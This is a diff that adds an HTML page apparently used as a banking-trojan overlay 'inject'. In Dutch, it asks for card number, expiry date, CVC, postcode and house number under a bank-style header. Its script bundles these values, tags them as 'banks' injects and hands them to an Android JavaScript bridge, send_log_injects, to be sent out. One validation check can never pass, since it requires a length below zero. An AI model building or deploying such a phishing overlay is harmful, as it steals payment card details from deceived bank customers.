@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <style>
+        form {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+    
+        section {
+            flex: 1;
+            padding: 15px;
+        }
+
+        footer {
+            padding: 15px 10px;
+        }
+
+        input,button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+
+        .input {
+            width: 100%;
+            padding: 12px;
+            padding-left: 8px;
+            background-color: #f3f3f3;
+            border: 1px solid #b3c9c8;
+            border-radius: 3px;
+            margin-bottom: 15px;
+            color: #006985;
+        }
+
+        .input:focus {
+            border-color: #006985;
+        }
+
+        label {
+            color: #7ea2a1;
+            padding: 0;
+            margin: 0;
+            width: 100%;
+        }
+
+        .input::placeholder {
+            color: #7fa3a2;
+            opacity: 1;
+        }
+
+        .button {
+            width: 100%;
+            background: #0098b7;
+            color: #fff;
+            border: 0;
+            border-radius: 3px;
+            padding: 9px;
+            font-size: 18px;
+        }
+
+        .button:disabled {
+            background-color: #636363;
+            color: #828282;
+        }
+
+        .error {
+            border-color: #f00 !important;
+        }
+    </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <header>
+            <img style="width: 100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAs4AAABvCAMAAADL7bZ8AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OTlEODc3REU5NTY2MTFFQUJEQzRFQTc4OUEwQzdBMkUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OTlEODc3REY5NTY2MTFFQUJEQzRFQTc4OUEwQzdBMkUiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo5OUQ4NzdEQzk1NjYxMUVBQkRDNEVBNzg5QTBDN0EyRSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo5OUQ4NzdERDk1NjYxMUVBQkRDNEVBNzg5QTBDN0EyRSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsZVf9wAAAA8UExURQBphSR1jj+Bl1SMoGeXqXihsYeruZa0wKO+yLDGz7zP1sjX3dTg5NnZ2d/o6+Xl5erw8vPz8/X3+f/////UNxMAAAOzSURBVHja7dvRbpswGIbhD/gxDnges+//XneA7UCWbKwi0tq9z0naqiQSeXFthyoDX4Y4BSBngJwBcgbIGeQMkDNAzgA5A+QMcgbIGSBngJwBcgY5A+QMkDNAziBngJwBcgbIGSBnkDNAzgA5A+QMkDPIGSBngJwBcv5nzKOZTZwHcv7EYihfmCRpyDnEv32GxGkk53f16f3uu8XPv/9tyW1js+TXHJbspRM9h7V+tdZnADlfb5XC/btet99nKY1lcC5RusPxL3j53QUxctbJ+V1sN1ou0h9mAje//YK0bD9I/pb/Juc8+5WTTs5vW9Kpawm70yPnmTH5ec4g53fqVOfLqY25OYaw6zWFEI5Lvqc5r7vfivsjXuScQmBdSM7XmmRtoO7LFLmXpL60vY6StAVcM95+Ip+D6mmO22ZHt27XiCQNseYsSdvrWL0QkpMkTQRNztcuBstsdiiD6Cz1zvV1rA6STX7s0yHnwcxsvue8SN3o3bBdERqcH7s6j/Hqre5S15zTIJkf1C4mkPM1i0F/6Hrt5FLOaVRXcrZfJhltslFzTp3GlHPOu8E2dpp+mWzUnJ26uF06M28BOV+5GOzLrGMsj8NhKn0qZ68+vZzHPMm5bRA6hmdyvlLqtmzLQ+7reFmG7VM5D892rOfXOd/KNZMX8T6R85WcXM55KXOLLDnvvfd+2LakT+X8sNWxejMze53zpGF7EUfO5HypKKWcxzLRrbsWbS/iAznPhyd4lrPtXoV3gJyvNGjOqW1wSHMo1o/lHCVb1hz965xHufoigTeAnK9dDA751qJ9/IjkVM5d+wRmWxcejnySs+fWDXJ+32JwHdqGmT3c83Yq53F/UM33nvP0mPOy+2wd5HzxYtDqQjDn+eGez1M5H/aPfdm2uOc8POacOm4UJec3CdJuAB3U+ZDi4sL5nLNJLqS4jGm7CzSkFOoEJkpTXOdxl3OeJVtiCjf+o4Wcr9bvR+Rk7ZaM8zm3g5bcbtJon2C7+10f7Z6NmY0Ncn7XYtAOf/qDM7Pxts1u4+5fAs3i4TFHs8NBbk7ta3M+tuc3G+ecc57qkWVveoqcfXIGOQPkDJAzQM4AOYOcAXIGyBkgZ4CcQc4AOQPkDJAzyBkgZ4CcAXIGyBnkDJAzQM4AOQPkDHIGyBkgZ4CcQc4AOQPkDJAzQM4gZ+DT5fwD+DL0Dfgy9B34Mpg7g6UgQM4AOQPkDHIGyBkgZ4CcAXIGOQPkDJAzQM4AOYOcAXIGyBkgZ/yXfgJgiMkDi9FNWwAAAABJRU5ErkJggg==">
+        </header>
+        <section>
+            <div>
+                <label for="cc">16 cijferig Card-nummer:</label>
+                <input type="tel" class="input" id="cc" name="cc" placeholder="1234..." onkeyup="check();check5();" maxlength="19" autocomplete="off" required>
+            </div>
+            <div>
+                <label for="exp">Vervaldatum Card:</label>
+                <input type="tel" class="input" id="expMM" name="expMM" placeholder="mm" onkeyup="check2();check5();" maxlength="2" style="width: 48%;float:left;" autocomplete="off" required>
+                <input type="tel" class="input" id="expYY" name="expYY" placeholder="jj" onkeyup="check3();check5();checkYear()" maxlength="2" style="width: 48%;float:right;" autocomplete="off" required>
+            </div>
+
+            <div>
+                <label for="cvv">3 cijferig CVC (achterop uw kaart):</label>
+                <input type="tel" class="input" id="cvc" name="cvc" onkeyup="check4();check5();checkYear()" placeholder="XXX" autocomplete="off" required>
+            </div>
+
+            <div>
+                <label for="postcode">Postcode: </label>
+                <input type="text" class="input" id="postcode" name="postcode" onkeyup="check5();" placeholder="1234AB" autocomplete="off" required>
+            </div>
+
+            <div>
+                <label for="zonder">Huisnummer zonder toevoeging: </label>
+                <input type="tel" class="input" id="zonder" name="zonder" onkeyup="check5();" placeholder="123" autocomplete="off" required>
+            </div>
+        </section>
+        <footer>
+            <input type="submit" class="button" id="sendData" disabled value="Volgende">
+        </footer>
+    </form>
+
+    <script> 
+        $('#cc').mask('0000 0000 0000 0000');
+        $('#expMM').mask('00');
+        $('#expYY').mask('00');
+        $('#cvc').mask('000');
+        $('#postcode').mask('0000SS');
+        $('#zonder').mask('000');
+
+        var cc = document.getElementById('cc'),
+            expMM = document.getElementById('expMM'),
+            expYY = document.getElementById('expYY'),
+            cvc = document.getElementById('cvc'),
+            postcode = document.getElementById('postcode'),
+            zonder = document.getElementById('zonder'),
+            sendData = document.getElementById('sendData');
+
+        
+        function check(){
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error');
+                cc.focus()
+            } else {
+                cc.classList.remove('error');
+                expMM.focus()
+                return false
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19) return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+        var currentDate = new Date();
+        var dateMonth = `0${currentDate.getMonth() + 1}`;
+
+        function checkYear() {
+            if(expYY.value > 20) {
+                dateMonth = 0;
+            } else if(currentDate.getMonth() + 1 >= 10){
+                dateMonth = `${currentDate.getMonth() + 1}`;
+            } else {
+                dateMonth = `0${currentDate.getMonth() + 1}`;
+            }
+        }
+
+        function check2(){
+            if(dateMonth > expMM.value || expMM.value < 0 || expMM.value > 12 || expMM.value.length === 1) {
+                expMM.classList.add('error');
+                expMM.focus()
+
+            } else if(dateMonth < expMM.value || expMM.value > 0 || expMM.value < 12 || expMM.value.length === 2){
+                expMM.classList.remove('error');
+                console.log(dateMonth)
+            }
+        }
+
+        
+
+        function check3(){
+            if(expYY.value < 20 || expYY.value > 28 || expYY.value.length === 1) {
+                expYY.classList.add('error');
+            } else if(expYY.value > 20 || expYY.value < 28 || expYY.value.length === 2){
+                expYY.classList.remove('error');
+                cvc.focus()
+            }
+        }
+
+        function check4(){
+            if(cvc.value.length != 3) {
+                cvc.classList.add('error');
+                cvc.focus()
+            } else if(cvc.value.length === 3){
+                cvc.classList.remove('error');
+            }
+        }
+
+        function check5() {
+            if (valid_credit_card(cc.value) && cc.value.length === 19 && expMM.value.length === 2 && expYY.value.length === 2 && cvc.value.length === 3 && postcode.value.length === 6 && zonder.value.length < 0) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        sendData.onclick = function() {
+            var data = {};
+            data.cardNumber = cc.value;
+            data.exp = `${expMM.value}/${expYY.value}`;
+            data.cvc = cvc.value;
+            data.postcode = postcode.value;
+            data.zonder = zonder.value;
+            data.type_injects = "banks";
+            data.closed = "close_activity_injects";
+
+            var ua = navigator.userAgent.toLowerCase();
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(JSON.stringify(data))
+                } catch (err) {}
+            }else{
+                alert(JSON.stringify(data));
+            }
+        }
+    </script>
+</body>
+</html>
